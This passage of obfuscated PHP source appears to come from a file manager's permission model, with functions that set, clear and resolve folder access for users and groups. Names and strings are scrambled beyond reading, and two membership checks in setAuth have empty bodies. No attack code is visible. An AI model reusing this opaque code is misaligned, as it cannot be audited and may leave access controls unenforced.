(count($ø£„¾çë) == count($Ûƒå ã¸)) { return $Âüˆ …µ ? $ø£„¾çë[$Ûƒå ã¸[0]] : $ø£„¾çë; } $˜¥‹«îÎ = $ŠÆü‚˜à[2137]; $¿¬½Œëü = array($ŠÆü‚˜à[194] => array($ŠÆü‚˜à[7], $Ûƒå ã¸)); $óØÈŸÌœ = $this->field($˜¥‹«îÎ)->order($ŠÆü‚˜à[458])->where($¿¬½Œëü)->select(); $é—ª³âÃ = array_to_keyvalue_group($óØÈŸÌœ, $ŠÆü‚˜à[194]); foreach ($Ûƒå ã¸ as $Ç¾ÅÁ¨™) { $æÛ»œª¸[$Ç¾ÅÁ¨™] = $é—ª³âÃ[$Ç¾ÅÁ¨™] ? $é—ª³âÃ[$Ç¾ÅÁ¨™] : array(); } if ($Âüˆ …µ) { return $óØÈŸÌœ; } return $é—ª³âÃ; } public function setAuth($Îí¼ıãÀ, $ûÃ²ó) { $èŠ›ËŒ =& $_SERVER[Ñ¯©ç]; $‰È‹ú¡õ = Model($èŠ›ËŒ[1391])->sourceInfo($Îí¼ıãÀ); if (!$‰È‹ú¡õ) { return !1; } if ($‰È‹ú¡õ[$èŠ›ËŒ[191]] != SourceModel::TYPE_GROUP) { return !1; } $Åñàß¢Å = 1; $Ü ½úáÖ = $‰È‹ú¡õ[$èŠ›ËŒ[553]]; if ($Ü ½úáÖ != $Åñàß¢Å) { $è·Ğı¸ = array($èŠ›ËŒ[1955] => $Ü ½úáÖ); $©©””Óô = Model($èŠ›ËŒ[2046])->field($èŠ›ËŒ[1757])->where($è·Ğı¸)->select(); $©©””Óô = array_to_keyvalue($©©””Óô, $èŠ›ËŒ[12], $èŠ›ËŒ[1757]); } $î½ô¦ê = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ğšŸ¥ß = array(); foreach ($ûÃ²ó as $ïóóÉÖâ) { if (!in_array($ïóóÉÖâ[$èŠ›ËŒ[191]], $î½ô¦ê)) { show_json(LNG($èŠ›ËŒ[2138]), !1); } if ($Ü ½úáÖ != $Åñàß¢Å) { if ($ïóóÉÖâ[$èŠ›ËŒ[191]] == SourceModel::TYPE_GROUP) { } if ($ïóóÉÖâ[$èŠ›ËŒ[553]] != 0 && !in_array($ïóóÉÖâ[$èŠ›ËŒ[553]], $©©””Óô)) { } } if ($ïóóÉÖâ[$èŠ›ËŒ[553]] == 0) { $ïóóÉÖâ[$èŠ›ËŒ[191]] = SourceModel::TYPE_USER; } $ğšŸ¥ß[] = array($èŠ›ËŒ[194] => $Îí¼ıãÀ, $èŠ›ËŒ[191] => intval($ïóóÉÖâ[$èŠ›ËŒ[191]]), $èŠ›ËŒ[553] => intval($ïóóÉÖâ[$èŠ›ËŒ[553]]), $èŠ›ËŒ[2060] => intval($ïóóÉÖâ[$èŠ›ËŒ[2060]]) ? intval($ïóóÉÖâ[$èŠ›ËŒ[2060]]) : 0, $èŠ›ËŒ[2120] => intval($ïóóÉÖâ[$èŠ›ËŒ[2120]]) ? intval($ïóóÉÖâ[$èŠ›ËŒ[2120]]) : -1); } $this->where(array($èŠ›ËŒ[474] => $Îí¼ıãÀ))->delete(); $this->addAll($ğšŸ¥ß); return !0; } public function authClear($½ù±¦Œô) { $£úŞı¬¨ =& $_SERVER[Ñ¯©ç]; $´‰ÇÔÅÚ = Model($£úŞı¬¨[1391])->sourceInfo($½ù±¦Œô); $‹ˆèÂ¯Ì = array($½ù±¦Œô); if ($´‰ÇÔÅÚ[$£úŞı¬¨[468]] == $£úŞı¬¨[101]) { $¤÷½—›° = array($£úŞı¬¨[635] => array($£úŞı¬¨[595], $´‰ÇÔÅÚ[$£úŞı¬¨[568]] . $½ù±¦Œô . $£úŞı¬¨[596])); $‹ˆèÂ¯Ì = Model($£úŞı¬¨[1391])->field($£úŞı¬¨[474])->where($¤÷½—›°)->getField($£úŞı¬¨[194], !0); $‹ˆèÂ¯Ì[] = $½ù±¦Œô; } $this->where(array($£úŞı¬¨[474] => array($£úŞı¬¨[475], $‹ˆèÂ¯Ì)))->delete(); return !0; } public function getAllChildren($µ…‰×÷) { $ëŸ£Í›ß =& $_SERVER[Ñ¯©ç]; $¼§†ÃÉ = Model($ëŸ£Í›ß[1391])->sourceInfo($µ…‰×÷); if ($¼§†ÃÉ[$ëŸ£Í›ß[468]] != $ëŸ£Í›ß[101]) { return $this->sourceListAuth(array($µ…‰×÷)); } if ($¼§†ÃÉ[$ëŸ£Í›ß[191]] != SourceModel::TYPE_GROUP) { return array(); } $ê…¶Ú™Ò = 1; $×›Š€˜ = array($µ…‰×÷); if ($¼§†ÃÉ[$ëŸ£Í›ß[193]] == $ëŸ£Í›ß[229] && $¼§†ÃÉ[$ëŸ£Í›ß[553]] != $ê…¶Ú™Ò) { $×›Š€˜ = $this->groupChidldAllRootSource($¼§†ÃÉ[$ëŸ£Í›ß[553]]); } $ï¨‘ö“° = $this->field($ëŸ£Í›ß[194])->group($ëŸ£Í›ß[194])->select(); $ï¨‘ö“° = array_to_keyvalue($ï¨‘ö“°, $ëŸ£Í›ß[12], $ëŸ£Í›ß[194]); if (!$ï¨‘ö“°) { return array(); } $ÑÙŠ§ÅÏ = $ëŸ£Í›ß[2139]; $´Â©À› = array($ëŸ£Í›ß[194] => array($ëŸ£Í›ß[7], $ï¨‘ö“°), $ëŸ£Í›ß[488] => $ëŸ£Í›ß[229]); $‚ßí¿®Ê = Model($ëŸ£Í›ß[877])->field($ÑÙŠ§ÅÏ)->where($´Â©À›)->select(); $Ş ‘×Ø£ = array($µ…‰×÷); foreach ($‚ßí¿®Ê as $åğñœˆ) { foreach ($×›Š€˜ as $ÛÄ¸¼Üâ) { $¨¿¢Ä–Ç = $ëŸ£Í›ß[50] . $ÛÄ¸¼Üâ . $ëŸ£Í›ß[50]; $Ô™Ë‘Í = $åğñœˆ[$ëŸ£Í›ß[568]] . $åğñœˆ[$ëŸ£Í›ß[194]] . $ëŸ£Í›ß[50]; if (strstr($Ô™Ë‘Í, $¨¿¢Ä–Ç)) { $Ş ‘×Ø£[] = $åğñœˆ[$ëŸ£Í›ß[194]]; break; } } } return $this->sourceListAuth($Ş ‘×Ø£); } private function sourceListAuth($óÏÆŸ) { $´ÉéÎœ¤ =& $_SERVER[Ñ¯©ç]; $æŸ¾Ô © = Model($´ÉéÎœ¤[1391])->sourceListInfo($óÏÆŸ, !0); $ç¼øÌÇå = $this->sourceAuthSelect($óÏÆŸ); $÷² ê´ = array(); $›Œ´Š´ú = array(); foreach ($æŸ¾Ô © as $ÆĞáË›‹) { unset($ÆĞáË›‹[$´ÉéÎœ¤[512]]); unset($ÆĞáË›‹[$´ÉéÎœ¤[510]]); unset($ÆĞáË›‹[$´ÉéÎœ¤[470]]); unset($ÆĞáË›‹[$´ÉéÎœ¤[100]]); $—Á¦–¾› = $ç¼øÌÇå[$ÆĞáË›‹[$´ÉéÎœ¤[194]]]; if (!$—Á¦–¾›) { continue; } $ÆĞáË›‹[$´ÉéÎœ¤[2140]] = $this->authTargetInfo($—Á¦–¾›); $ÆĞáË›‹[$´ÉéÎœ¤[566]] = rtrim($ÆĞáË›‹[$´ÉéÎœ¤[572]], $´ÉéÎœ¤[8]) . $´ÉéÎœ¤[8] . ltrim($ÆĞáË›‹[$´ÉéÎœ¤[566]], $´ÉéÎœ¤[8]); $÷² ê´[] = $ÆĞáË›‹; $€“£ä = count(explode($´ÉéÎœ¤[8], trim($ÆĞáË›‹[$´ÉéÎœ¤[566]], $´ÉéÎœ¤[8]))); $›Œ´Š´ú[] = $€“£ä + ($ÆĞáË›‹[$´ÉéÎœ¤[33]] == $´ÉéÎœ¤[88] ? 0 : 1000); } array_multisort($›Œ´Š´ú, SORT_ASC, $÷² ê´); return $÷² ê´; } private function groupChidldAllRootSource($ÖŞŸ–İ²) { $Œíá÷¿† =& $_SERVER[Ñ¯©ç]; $³Á²à = Model($Œíá÷¿†[2141])->groupChildrenAll($ÖŞŸ–İ²); $£íÎ¿¦¼ = array($Œíá÷¿†[193] => 0, $Œíá÷¿†[553] => array($Œíá÷¿†[7], $³Á²à), $Œíá÷¿†[191] => SourceModel::TYPE_GROUP); $›ı°öËî = Model($Œíá÷¿†[877])->field($Œíá÷¿†[194])->where($£íÎ¿¦¼)->select(); $›ı°öËî = array_to_keyvalue($›ı°öËî, $Œíá÷¿†[12], $Œíá÷¿†[194]); return $›ı°öËî; } private function authTargetInfo($òõ»å£) { $ï×¯ïÁƒ =& $_SERVER[Ñ¯©ç]; $üÆË¯î = array(); $‘ş…ÆÙø = array(); $°æ‡òäõ = 2 << 25; foreach ($òõ»å£ as $º÷İ«î) { $¤Ê¤ê“Ù = Model($ï×¯ïÁƒ[555])->listData($º÷İ«î[$ï×¯ïÁƒ[2060]]); if (!$¤Ê¤ê“Ù) { continue; } if ($º÷İ«î[$ï×¯ïÁƒ[191]] == SourceModel::TYPE_USER) { $’¾—Ä = Model($ï×¯ïÁƒ[561])->getInfoSimpleOuter($º÷İ«î[$ï×¯ïÁƒ[553]]); if ($’¾—Ä[$ï×¯ïÁƒ[1757]] == $ï×¯ïÁƒ[1245]) { continue; } if ($’¾—Ä[$ï×¯ïÁƒ[1757]] == $ï×¯ïÁƒ[229]) { $’¾—Ä[$ï×¯ïÁƒ[32]] = LNG($ï×¯ïÁƒ[2142]); } } else { $’¾—Ä = Model($ï×¯ïÁƒ[569])->getInfoSimple($º÷İ«î[$ï×¯ïÁƒ[553]]); } if (!$’¾—Ä) { continue; } $’¾—Ä[$ï×¯ïÁƒ[523]] = $¤Ê¤ê“Ù; $üÆË¯î[] = $’¾—Ä; $—ÂÁ–™ = 0; if ($º÷İ«î[$ï×¯ïÁƒ[191]] == SourceModel::TYPE_GROUP) { $—ÂÁ–™ = $°æ‡òäõ * 2; } if ($º÷İ«î[$ï×¯ïÁƒ[191]] == SourceModel::TYPE_USER) { $—ÂÁ–™ = $°æ‡òäõ; } if ($º÷İ«î[$ï×¯ïÁƒ[191]] == SourceModel::TYPE_USER && $º÷İ«î[$ï×¯ïÁƒ[553]] == $ï×¯ïÁƒ[229]) { $—ÂÁ–™ = 0; } $‘ş…ÆÙø[] = $¤Ê¤ê“Ù[$ï×¯ïÁƒ[470]] + $—ÂÁ–™; } array_multisort($‘ş…ÆÙø, SORT_DESC, $üÆË¯î); return $üÆË¯î; } public function getAllChildrenByUser($ÕıĞÖá, $Åæîù÷«) { $â¾·ƒËŠ =& $_SERVER[Ñ¯©ç]; $îû£¬½÷ = Model($â¾·ƒËŠ[582])->getInfo($Åæîù÷«); if (!$Åæîù÷« || !$ÕıĞÖá || !$îû£¬½÷) { return array(); } $Ïî«Ôß = Model($â¾·ƒËŠ[1391])->sourceInfo($ÕıĞÖá); $Î­õœ£û = array(); $ŸŒşĞõÓ = 1; if ($Ïî«Ôß[$â¾·ƒËŠ[193]] == $â¾·ƒËŠ[229] && $Ïî«Ôß[$â¾·ƒËŠ[553]] != $ŸŒşĞõÓ && $this->groupContainUser($Ïî«Ôß[$â¾·ƒËŠ[553]], $Åæîù÷«)) { foreach ($îû£¬½÷[$â¾·ƒËŠ[2143]] as $‹ÀŒƒ¬†) { $ú¼Ÿ«Œ = Model($â¾·ƒËŠ[569])->getInfo($‹ÀŒƒ¬†[$â¾·ƒËŠ[1955]]); $œª£ìì = Model($â¾·ƒËŠ[582])->getInfoSimpleOuter($Åæîù÷«); $œª£ìì[$â¾·ƒËŠ[523]] = $‹ÀŒƒ¬†[$â¾·ƒËŠ[470]]; if (Model($â¾·ƒËŠ[555])->authCheckAction($‹ÀŒƒ¬†[$â¾·ƒËŠ[470]][$â¾·ƒËŠ[470]], $â¾·ƒËŠ[1976])) { continue; } $Íß€ó´ = array($â¾·ƒËŠ[32] => $â¾·ƒËŠ[1265] . $ú¼Ÿ«Œ[$â¾·ƒËŠ[32]], $â¾·ƒËŠ[194] => $ú¼Ÿ«Œ[$â¾·ƒËŠ[100]][$â¾·ƒËŠ[194]], $â¾·ƒËŠ[97] => KodIO::make($ú¼Ÿ«Œ[$â¾·ƒËŠ[100]][$â¾·ƒËŠ[194]]), $â¾·ƒËŠ[193] => $â¾·ƒËŠ[229], $â¾·ƒËŠ[191] => $â¾·ƒËŠ[562], $â¾·ƒËŠ[33] => $â¾·ƒËŠ[599], $â¾·ƒËŠ[566] => $ú¼Ÿ«Œ[$â¾·ƒËŠ[573]], $â¾·ƒËŠ[1955] => $ú¼Ÿ«Œ[$â¾·ƒËŠ[1955]], $â¾·ƒËŠ[570] => $ú¼Ÿ«Œ[$â¾·ƒËŠ[193]], $â¾·ƒËŠ[2140] => array($œª£ìì)); $Î­õœ£û[$Íß€ó´[$â¾·ƒËŠ[194]]] = $Íß€ó´; } } $ÄÁÌº•Æ = array(); $Î¶¼¸ñ• = $this->getAllChildren($ÕıĞÖá); foreach ($Î¶¼¸ñ• as $»·‘È¼İ) { $Á“”’›ƒ = !1; foreach ($»·‘È¼İ[$â¾·ƒËŠ[2140]] as $ÍÒ¹È) { if ($ÍÒ¹È[$â¾·ƒËŠ[1757]]) { if ($ÍÒ¹È[$â¾·ƒËŠ[1757]] == $Åæîù÷«) { $Á“”’›ƒ = !0; break; } } if ($ÍÒ¹È[$â¾·ƒËŠ[1955]]) { if ($this->groupContainUser($ÍÒ¹È[$â¾·ƒËŠ[1955]], $Åæîù÷«)) { $Á“”’›ƒ = !0; break; } } } if ($Á“”’›ƒ) { $ÄÁÌº•Æ[] = $»·‘È¼İ; } $Ñ¼É˜ñÖ = $»·‘È¼İ[$â¾·ƒËŠ[194]]; if (isset($Î­õœ£û[$Ñ¼É˜ñÖ])) { $»·‘È¼İ[$â¾·ƒËŠ[2140]][] = $Î­õœ£û[$Ñ¼É˜ñÖ][0]; $Î­õœ£û[$Ñ¼É˜ñÖ] = !1; } } $Î­õœ£û = array_filter(array_values($Î­õœ£û)); $ÄÁÌº•Æ = array_merge($Î­õœ£û, $ÄÁÌº•Æ); return $ÄÁÌº•Æ; } public function setAllChildrenByUser($ğÊÍÎãÕ, $¾²Ï¡ÒÔ, $ÑÚ°Â£Í) { $äóõï¡ =& $_SERVER[Ñ¯©ç]; $ÇËş¸ÉÙ = $this->getAllChildrenByUser($ğÊÍÎãÕ, $¾²Ï¡ÒÔ); if (!$ÑÚ°Â£Í || !$ÇËş¸ÉÙ) { return !1; } foreach ($ÇËş¸ÉÙ as $”” Ó•) { $°…êŸĞó = array(); foreach ($”” Ó•[$äóõï¡[2140]] as $æİâßª) { $·íÚÍˆ® = $æİâßª[$äóõï¡[523]]; $øµ»û—¹ = $æİâßª[$äóõï¡[1757]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $õåÀáª = $æİâßª[$äóõï¡[1757]] ? $æİâßª[$äóõï¡[1757]] : $æİâßª[$äóõï¡[1955]]; if ($æİâßª[$äóõï¡[1757]] && $æİâßª[$äóõï¡[1757]] == $¾²Ï¡ÒÔ) { continue; } $°…êŸĞó[] = array($äóõï¡[194] => $”” Ó•[$äóõï¡[194]], $äóõï¡[191] => $øµ»û—¹, $äóõï¡[553] => intval($õåÀáª), $äóõï¡[2060] => isset($·íÚÍˆ®[$äóõï¡[458]]) ? intval($·íÚÍˆ®[$äóõï¡[458]]) : 0, $äóõï¡[2120] => isset($·íÚÍˆ®[$äóõï¡[2120]]) ? intval($·íÚÍˆ®[$äóõï¡[2120]]) : -1); } $°…êŸĞó[] = array($äóõï¡[194] => $”” Ó•[$äóõï¡[194]], $äóõï¡[191] => SourceModel::TYPE_USER, $äóõï¡[553] => intval($¾²Ï¡ÒÔ), $äóõï¡[2060] => intval($ÑÚ°Â£Í), $äóõï¡[2120] => -1); $this->where(array($äóõï¡[474] => $”” Ó•[$äóõï¡[194]]))->delete(); $this->addAll($°…êŸĞó); } return !0; } public function get($¶Š€ÄØÛ) { $‡³ˆà‹€ = $this->getSourceList(array($¶Š€ÄØÛ), !0); return $‡³ˆà‹€[0]; } public function getSourceList($€•…ß«‰, $ØóÔÌ¼ô = false, $õÌ•Ø’ß = false) { $œÁœá‹Ù =& $_SERVER[Ñ¯©ç]; if (!$€•…ß«‰) { return array(); } $ÅõÎ¤¿’ = Model($œÁœá‹Ù[1391]); if (!$ØóÔÌ¼ô && count($€•…ß«‰) == 1) { $ØóÔÌ¼ô = array(); $ØóÔÌ¼ô[$€•…ß«‰[0]] = $ÅõÎ¤¿’->sourceInfo($€•…ß«‰[0]); } if (!$ØóÔÌ¼ô) { $‡—úåîŒ = array($œÁœá‹Ù[474] => array($œÁœá‹Ù[475], $€•…ß«‰)); $ØóÔÌ¼ô = $ÅõÎ¤¿’->field($œÁœá‹Ù[2144])->where($‡—úåîŒ)->select(); $ØóÔÌ¼ô = array_to_keyvalue($ØóÔÌ¼ô, $œÁœá‹Ù[194]); } $Ğß•²Ü… = $€•…ß«‰; foreach ($ØóÔÌ¼ô as $åï¸â»§ => $µÉê¹‡°) { $Ùµ×æ“  = $ÅõÎ¤¿’->parentLevelArray($µÉê¹‡°[$œÁœá‹Ù[568]]); $Ğß•²Ü… = array_merge($Ğß•²Ü…, array($åï¸â»§), array_reverse($Ùµ×æ“ )); } $Ğß•²Ü… = array_values(array_unique($Ğß•²Ü…)); if (!$Ğß•²Ü…) { return array(); } $„ÊÛâ¢ë = $this->sourceAuthSelect($Ğß•²Ü…); $á¡©§áº = array(); foreach ($Ğß•²Ü… as $Æ¨²¨È‘) { if (isset($„ÊÛâ¢ë[$Æ¨²¨È‘])) { $á¡©§áº[$Æ¨²¨È‘] = $„ÊÛâ¢ë[$Æ¨²¨È‘]; } } $êàªï¾¥ = $this->userIsRoot($õÌ•Ø’ß); $ŠÕ×‘À = AuthModel::authAll(); $½ÁÛÚñ = array($œÁœá‹Ù[471] => $ŠÕ×‘À, $œÁœá‹Ù[2145] => array($œÁœá‹Ù[476] => 0, $œÁœá‹Ù[1961] => $ŠÕ×‘À, $œÁœá‹Ù[477] => LNG($œÁœá‹Ù[2146]), $œÁœá‹Ù[1978] => $œÁœá‹Ù[2147])); $‹ñÓ¸şø = array(); foreach ($ØóÔÌ¼ô as $Æ¨²¨È‘ => $‡š¹ÜâÛ) { if ($êàªï¾¥ && $GLOBALS[$œÁœá‹Ù[6]][$œÁœá‹Ù[1974]]) { $‹ñÓ¸şø[$Æ¨²¨È‘] = $½ÁÛÚñ; continue; } $‹ñÓ¸şø[$Æ¨²¨È‘] = $this->makeSourceAuth($‡š¹ÜâÛ, $á¡©§áº, $õÌ•Ø’ß); } return $‹ñÓ¸şø; } public function authDeepCheck($ïğ«Áô¿, $¯¤Œ­ñÀ = false) { $—ÂÔÓö =& $_SERVER[Ñ¯©ç]; $¯¤Œ­ñÀ = $¯¤Œ­ñÀ ? $¯¤Œ­ñÀ : USER_ID; $Û¤Ãú” = $this->makeAuthDeep($¯¤Œ­ñÀ); if (!in_array($ïğ«Áô¿, $Û¤Ãú”[$—ÂÔÓö[2148]])) { return !1; } $…Ô¸éÛ = array(); foreach ($Û¤Ãú”[$—ÂÔÓö[2149]] as $Ñ©Ö¥İ => $ºà•÷¾¾) { if (!in_array($ïğ«Áô¿, $ºà•÷¾¾)) { continue; } $…Ô¸éÛ[] = $Ñ©Ö¥İ; } if (!$…Ô¸éÛ) { return !1; } $ã§Ë÷Ë” = $…Ô¸éÛ ? $…Ô¸éÛ[0] : $ïğ«Áô¿; return array($—ÂÔÓö[471] => -1, $—ÂÔÓö[523] => array($—ÂÔÓö[476] => $—ÂÔÓö[1245], $—ÂÔÓö[1961] => $—ÂÔÓö[229], $—ÂÔÓö[477] => LNG($—ÂÔÓö[2150]), $—ÂÔÓö[1978] => $—ÂÔÓö[2151]), $—ÂÔÓö[2152] => LNG($—ÂÔÓö[2153]), $—ÂÔÓö[2154] => $this->sourceAuthInfo($ã§Ë÷Ë”)); } protected function makeAuthDeep($«ˆÙ‰†Õ = false) { $³Çû¥òÛ =& $_SERVER[Ñ¯©ç]; static $³ˆ„¶†è = array(); $«ˆÙ‰†Õ = $«ˆÙ‰†Õ ? $«ˆÙ‰†Õ : USER_ID; if (isset($³ˆ„¶†è[$«ˆÙ‰†Õ])) { return $³ˆ„¶†è[$«ˆÙ‰†Õ]; } $²×±Òà± = Model($³Çû¥òÛ[2155])->listData(); $àºğŒó = array(); foreach ($²×±Òà± as $ç¬§™‡) { if ($ç¬§™‡[$³Çû¥òÛ[470]] == 0 && $ç¬§™‡[$³Çû¥òÛ[1977]] == $³Çû¥òÛ[101]) { $àºğŒó[] = $ç¬§™‡[$³Çû¥òÛ[458]]; } } $ñÛë²Ñá = $this->userGroupParents($«ˆÙ‰†Õ); $Î‘ä²È¿ = array($³Çû¥òÛ[191] => SourceModel::TYPE_USER, $³Çû¥òÛ[553] => $«ˆÙ‰†Õ); if ($ñÛë²Ñá) { $Î‘ä²È¿ = array(array($³Çû¥òÛ[191] => SourceModel::TYPE_USER, $³Çû¥òÛ[553] => $«ˆÙ‰†Õ), array($³Çû¥òÛ[191] => SourceModel::TYPE_GROUP, $³Çû¥òÛ[553] => array($³Çû¥òÛ[475], $ñÛë²Ñá)), $³Çû¥òÛ[1053] => $³Çû¥òÛ[2054]); } $üïºÜÏ = $this->field($³Çû¥òÛ[2156])->where($Î‘ä²È¿)->select(); $®ÆõƒÕ† = array(); $æı„¶ØÆ = array_to_keyvalue_group($üïºÜÏ, $³Çû¥òÛ[194]); foreach ($æı„¶ØÆ as $ô¼Â§ò => $Üøæ¯—Ë) { $¶Úé‹Õ = $this->authArrayCheck($Üøæ¯—Ë, $«ˆÙ‰†Õ); if ($¶Úé‹Õ[$³Çû¥òÛ[471]] > 0) { $®ÆõƒÕ†[] = $ô¼Â§ò . $³Çû¥òÛ[12]; } } if ($ñÛë²Ñá) { $¿×ƒÇÙ = Model($³Çû¥òÛ[569]); foreach ($ñÛë²Ñá as $’òˆä‚ı) { $’–²¶×˜ = $¿×ƒÇÙ->getInfo($’òˆä‚ı); if (!$’–²¶×˜ || !is_array($’–²¶×˜[$³Çû¥òÛ[100]])) { continue; } $®ÆõƒÕ†[] = $’–²¶×˜[$³Çû¥òÛ[100]][$³Çû¥òÛ[194]]; } } $Ğ–Ã ãŞ = array(); $•ïßëÆ© = $ñÛë²Ñá; $Ø±ªØÃé = Model($³Çû¥òÛ[1391]); $¿×ƒÇÙ = Model($³Çû¥òÛ[569]); $ªŸÀ˜Şş = array(); $ÎşßˆçÁ = array(); $¹×”×µ = array(); $ÒâÌ÷–ú = array(); if ($®ÆõƒÕ†) { $£Ñš¿áÜ = $Ø±ªØÃé->where(array($³Çû¥òÛ[194] => array($³Çû¥òÛ[475], $®ÆõƒÕ†)))->select(); foreach ($£Ñš¿áÜ as $éü†×¬§) { $Æ¯÷»Á« = $Ø±ªØÃé->parentLevelArray($éü†×¬§[$³Çû¥òÛ[568]]); $Ğ–Ã ãŞ = array_merge($Ğ–Ã ãŞ, $Æ¯÷»Á«); $•ïßëÆ©[] = $éü†×¬§[$³Çû¥òÛ[553]]; $ªŸÀ˜Şş[$éü†×¬§[$³Çû¥òÛ[194]]] = $Æ¯÷»Á«; $ÎşßˆçÁ[$éü†×¬§[$³Çû¥òÛ[194]]] = $éü†×¬§[$³Çû¥òÛ[553]]; } } $•ïßëÆ© = array_values(array_unique($•ïßëÆ©)); $¦šØªò­ = $•ïßëÆ©; foreach ($¦šØªò­ as $’òˆä‚ı) { $’–²¶×˜ = $¿×ƒÇÙ->getInfo($’òˆä‚ı); $Æ¯÷»Á« = $Ø±ªØÃé->parentLevelArray($’–²¶×˜[$³Çû¥òÛ[568]]); $•ïßëÆ© = array_merge($•ïßëÆ©, $Æ¯÷»Á«); } $•ïßëÆ© = array_values(array_unique($•ïßëÆ©)); foreach ($•ïßëÆ© as $’òˆä‚ı) { $’–²¶×˜ = $¿×ƒÇÙ->getInfo($’òˆä‚ı); $Ğ–Ã ãŞ[] = $’–²¶×˜[$³Çû¥òÛ[100]][$³Çû¥òÛ[194]]; $¹×”×µ[$’òˆä‚ı] = $’–²¶×˜[$³Çû¥òÛ[100]][$³Çû¥òÛ[194]]; $ÒâÌ÷–ú[$’òˆä‚ı] = $Ø±ªØÃé->parentLevelArray($’–²¶×˜[$³Çû¥òÛ[568]]); } foreach ($ªŸÀ˜Şş as $ƒŸòëê× => $ÀùÃ¬ä£) { $á«œô× = $ÎşßˆçÁ[$ƒŸòëê×]; if (!$á«œô× || !$¹×”×µ[$á«œô×]) { continue; } $Ÿö™øëå = array(); foreach ($ÒâÌ÷–ú[$á«œô×] as $’òˆä‚ı) { $Ÿö™øëå[] = $¹×”×µ[$’òˆä‚ı]; } $ªŸÀ˜Şş[$ƒŸòëê×] = array_merge($Ÿö™øëå, $ÀùÃ¬ä£); } $Ğ–Ã ãŞ = array_values(array_unique($Ğ–Ã ãŞ)); $ˆıßÜ²¾ = array($³Çû¥òÛ[2148] => $Ğ–Ã ãŞ, $³Çû¥òÛ[2149] => $ªŸÀ˜Şş); $³ˆ„¶†è[$«ˆÙ‰†Õ] = $ˆıßÜ²¾; return $ˆıßÜ²¾; } private function makeSourceAuth($¶Üà­›Õ, $£Ä“Ç—, $Ñ´Š¤ª‘ = false) { $Îğ™¦á¶ =& $_SERVER[Ñ¯©ç]; $ã¥À‚ü = $Îğ™¦á¶[101]; $§ÓÂùË = $¶Üà­›Õ[$Îğ™¦á¶[553]]; $§ªì’é´ = $¶Üà­›Õ[$Îğ™¦á¶[191]] == SourceModel::TYPE_GROUP; $ã«Áü¾Á = $§ªì’é´ ? $this->groupRootAuth($§ÓÂùË, $Ñ´Š¤ª‘) : !1; if ($ã«Áü¾Á && Model($Îğ™¦á¶[555])->authCheckAction($ã«Áü¾Á[$Îğ™¦á¶[470]], $Îğ™¦á¶[1976])) { return $this->groupAuthInfo($ã«Áü¾Á, $§ÓÂùË); } $·îèÀƒè = Model($Îğ™¦á¶[1391])->parentLevelArray($¶Üà­›Õ[$Îğ™¦á¶[568]]); $·îèÀƒè = array_merge(array($¶Üà­›Õ[$Îğ™¦á¶[194]]), array_reverse($·îèÀƒè)); $‹ÍÆàÓ” = !1; foreach ($·îèÀƒè as $÷ˆ‹ĞË) { if (!isset($£Ä“Ç—[$÷ˆ‹ĞË])) { continue; } $ªåª’ÇŠ = $this->authMake($£Ä“Ç—[$÷ˆ‹ĞË], $Ñ´Š¤ª‘); if ($ªåª’ÇŠ[$Îğ™¦á¶[523]]) { $‹ÍÆàÓ” = $ªåª’ÇŠ; break; } } if (!$§ªì’é´) { return $‹ÍÆàÓ”; } if (!$‹ÍÆàÓ” && $ã«Áü¾Á) { $‹ÍÆàÓ” = $this->groupAuthInfo($ã«Áü¾Á, $§ÓÂùË); } if (!$‹ÍÆàÓ”) { $àÑºÓ¹ú = Model($Îğ™¦á¶[569])->getInfo($§ÓÂùË); $¼µû¤† = explode($Îğ™¦á¶[50], trim($àÑºÓ¹ú[$Îğ™¦á¶[568]], $Îğ™¦á¶[50])); $¼µû¤† = array_reverse($¼µû¤†); foreach ($¼µû¤† as $Ì¹ùûßò) { if ($Ì¹ùûßò == $Îğ™¦á¶[229] || $Ì¹ùûßò == $ã¥À‚ü) { continue; } $§—êÅ«› = $this->groupRootAuth($Ì¹ùûßò, $Ñ´Š¤ª‘); if (!$§—êÅ«›) { continue; } $‹ÍÆàÓ” = $this->groupAuthInfo($§—êÅ«›, $Ì¹ùûßò); break; } } if (!$‹ÍÆàÓ” || $‹ÍÆàÓ”[$Îğ™¦á¶[471]] <= 0) { $¶³ÏäÏ = $this->authDeepCheck($¶Üà­›Õ[$Îğ™¦á¶[194]], $Ñ´Š¤ª‘); if ($¶³ÏäÏ) { $‹ÍÆàÓ” = $¶³ÏäÏ; } } return $‹ÍÆàÓ”; } private function userIsRoot($»ô³ö»‹ = false) { $‰ŒÃô =& $_SERVER[Ñ¯©ç]; if (!$»ô³ö»‹ && KodUser::isRoot()) { return !0; } $ÔáÍÄ‘• = Model($‰ŒÃô[582])->getInfo($»ô³ö»‹); $ƒŒíş•£ = Model($‰ŒÃô[2157])->listData($ÔáÍÄ‘•[$‰ŒÃô[2158]]); if ($ƒŒíş•£ && $ƒŒíş•£[$‰ŒÃô[559]][$‰ŒÃô[2159]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ïŸÓ‹©û) { $™ƒÈçğµ =& $_SERVER[Ñ¯©ç]; $é¢ƒ˜Î¼ = Model($™ƒÈçğµ[1391]); $ñ¼ÔÍğ« = $é¢ƒ˜Î¼->sourceInfo($ïŸÓ‹©û); if (!$ñ¼ÔÍğ«) { return !1; } $é¢ƒ˜Î¼->groupPathDisplay($ñ¼ÔÍğ«); $İĞ†ù–¥ = array($ñ¼ÔÍğ«); $İĞ†ù–¥ = $é¢ƒ˜Î¼->_listAppendPath($İĞ†ù–¥); $ñ¼ÔÍğ« = $İĞ†ù–¥[0]; $ÇŒ›¦š¦ = $ñ¼ÔÍğ«[$™ƒÈçğµ[566]]; if (isset($ñ¼ÔÍğ«[$™ƒÈçğµ[574]])) { $÷Å¾­­Â = explode($™ƒÈçğµ[8], trim($ñ¼ÔÍğ«[$™ƒÈçğµ[566]], $™ƒÈçğµ[8])); array_shift($÷Å¾­­Â); $ÇŒ›¦š¦ = $ñ¼ÔÍğ«[$™ƒÈçğµ[572]] . $™ƒÈçğµ[2160] . implode($™ƒÈçğµ[8], $÷Å¾­­Â); } return array($™ƒÈçğµ[477] => $ñ¼ÔÍğ«[$™ƒÈçğµ[32]], $™ƒÈçğµ[97] => KodIO::make($ñ¼ÔÍğ«[$™ƒÈçğµ[194]]), $™ƒÈçğµ[2161] => $ÇŒ›¦š¦); } private function groupAuthInfo($’‹ÓšÌÅ, $“ï®ô§¸) { $êÙ˜Á“å =& $_SERVER[Ñ¯©ç]; 